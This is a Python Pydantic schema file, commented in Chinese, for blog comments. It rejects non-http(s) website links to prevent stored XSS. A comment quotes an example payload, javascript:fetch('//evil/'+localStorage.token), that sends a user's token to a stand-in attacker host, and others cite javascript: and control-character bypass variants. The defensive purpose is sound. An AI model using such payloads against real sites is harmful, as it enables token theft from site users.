"""评论 Schema。"""

from __future__ import annotations

import re
from datetime import datetime
from urllib.parse import urlsplit

from pydantic import BaseModel, ConfigDict, EmailStr, Field, field_validator

# 允许出现在「网站」链接里的协议。只放行 http/https：
# 这个字段是完全由访客控制的，而前端把它直接绑到 `:href` 上，
# 而 Vue **不会**清洗动态 href。若不限协议，访客提交
# `javascript:fetch('//evil/'+localStorage.token)` 就能变成存储型 XSS
# （全站 token 就存在 localStorage）。同源 CSP 只是碰巧兜了一层，
# 开发态 / 换 CDN 部署时并不存在，不能当作防线。
_ALLOWED_SITE_SCHEMES = frozenset({"http", "https"})

# 形如 `scheme:` 的前缀（RFC 3986 的 scheme 语法）
_SCHEME_PREFIX = re.compile(r"^([a-zA-Z][a-zA-Z0-9+.\-]*):")
# 空白与控制字符：浏览器解析 URL 时会自行剥掉它们，
# 所以 `java\nscript:alert(1)` 在浏览器眼里就是 `javascript:alert(1)`。
# 必须在这一步就拒绝，不能留给后面的解析去"容错"。
_CONTROL_OR_SPACE = re.compile(r"[\s\x00-\x1f\x7f]")


class CommentCreate(BaseModel):
    author_name: str | None = Field(
        default=None, max_length=50, description="登录用户可留空，自动取昵称"
    )
    author_email: EmailStr | None = Field(default=None, description="不公开，仅站长可见")
    author_site: str | None = Field(default=None, max_length=255)
    content: str = Field(min_length=1, max_length=2000)
    parent_id: int | None = Field(default=None, description="回复某条评论时传其 id，仅支持两级")

    @field_validator("content")
    @classmethod
    def _strip(cls, value: str) -> str:
        value = value.strip()
        if not value:
            raise ValueError("评论内容不能为空")
        return value

    @field_validator("author_name")
    @classmethod
    def _clean_name(cls, value: str | None) -> str | None:
        if value is None:
            return None
        cleaned = value.strip()
        return cleaned or None

    @field_validator("author_site")
    @classmethod
    def _clean_site(cls, value: str | None) -> str | None:
        """只接受 http/https 的绝对地址。

        三种输入的区别要分清：

        - 空值 / 纯空白：视为「没填」，正常放行为 None；
        - 合法 http(s) 地址：返回规范化结果（裸域名补全 https）；
        - 其它（`javascript:`、`data:`、`vbscript:` 等）：**报错拒绝**，
          而不是静默丢弃——静默丢弃会让攻击者以为提交成功，
          也让运维在排查时看不到有人正在试探。

        判断顺序很关键，这里踩过一次：**必须先识别自带的协议，再决定要不要补
        `https://`**。若先无条件补协议，`javascript:alert(1)` 会变成
        `https://javascript:alert(1)`，协议项看起来是合法的 https，
        伪协议就这样蒙混过关了。
        """
        if value is None:
            return None
        cleaned = value.strip()
        if not cleaned:
            return None

        # 1) 空白 / 控制字符一律拒绝（`java\\nscript:` 就死在这一步）
        if _CONTROL_OR_SPACE.search(cleaned):
            raise ValueError("网站地址不能包含空格或换行")

        # 2) 先看是否自带协议
        scheme_match = _SCHEME_PREFIX.match(cleaned)
        if scheme_match:
            if scheme_match.group(1).lower() not in _ALLOWED_SITE_SCHEMES:
                raise ValueError("网站地址只支持 http 或 https 协议")
            candidate = cleaned
        else:
            # 容忍「example.com」这种没写协议的输入
            candidate = f"https://{cleaned}"

        # 3) 结构校验。`.port` 在端口不是纯数字时会抛 ValueError，
        #    正好用来拦下 `https://javascript:alert(1)` 这类残留变体。
        parts = urlsplit(candidate)
        if not parts.netloc:
            raise ValueError("网站地址格式不正确")
        try:
            _ = parts.port
        except ValueError as exc:
            raise ValueError("网站地址格式不正确") from exc
        return candidate


class CommentRead(BaseModel):
    model_config = ConfigDict(from_attributes=True)

    id: int
    article_id: int
    parent_id: int | None = None
    author_name: str
    author_site: str | None = None
    content: str
    is_admin_reply: bool
    is_approved: bool
    created_at: datetime
    replies: list[CommentRead] = Field(default_factory=list)


CommentRead.model_rebuild()


class CommentModerate(BaseModel):
    """站长审核 / 删除以外的人工调整。"""

    is_approved: bool | None = None
